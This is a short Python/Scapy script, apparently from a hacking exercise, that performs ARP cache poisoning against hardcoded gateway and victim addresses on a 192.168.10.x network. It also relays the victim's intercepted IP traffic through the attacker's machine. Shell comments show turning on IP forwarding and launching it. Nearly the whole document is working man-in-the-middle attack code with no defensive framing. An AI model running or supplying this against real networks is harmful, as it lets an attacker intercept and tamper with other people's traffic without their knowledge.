
#cat > arp_spoofing.py

#Python 2.7
#-*-coding:utf-8 -*-
from scapy.all import *
from threading import Thread
import time

gateway_ip = "192.168.10.2"
gateway_mac = "00:50:56:fb:40:0c"
victim_ip = "192.168.10.202"
victim_mac = "00:0c:29:c5:f8:30"
attacker_ip = "192.168.10.219"
attacker_mac = "00:0c:29:84:9c:55"

poison_timer = 0.1

def monitor_callback(pkt):
	if IP in pkt:
		if pkt[Ether].src == victim_mac:
			pkt[Ether].dst = gateway_mac
			pkt[Ether].src = attacker_mac
			sendp(fragment(pkt), verbose = 0)
		elif pkt[IP].dst == victim_ip:
			pkt[Ether].dst = victim_mac
			pkt[Ether].src = attacker_mac
			sendp(fragment(pkt), verbose = 0)

class Monitor(Thread):
	def __init__(self):
		Thread.__init__(self)
	def run(self):
		sniff(prn = monitor_callback, filter = "ip", store = 0)

class Poison(Thread):
	def __init__(self):
		Thread.__init__(self)
	def run(self):
		gateway_is_at = ARP(op = 2, psrc = gateway_ip, pdst = victim_ip, hwdst = attacker_mac)
		victim_is_at = ARP(op = 2, psrc = victim_ip, pdst = gateway_ip, hwdst = attacker_mac)
		while True:
			send(gateway_is_at, verbose = 0)
			send(victim_is_at, verbose = 0)
			time.sleep(poison_timer)

monitor = Monitor()
poison = Poison()

monitor.start()
poison.start()

#echo 1 > /proc/sys/net/ipv4/ip_forward

#python arp_spoofing.py

#CRT + Z
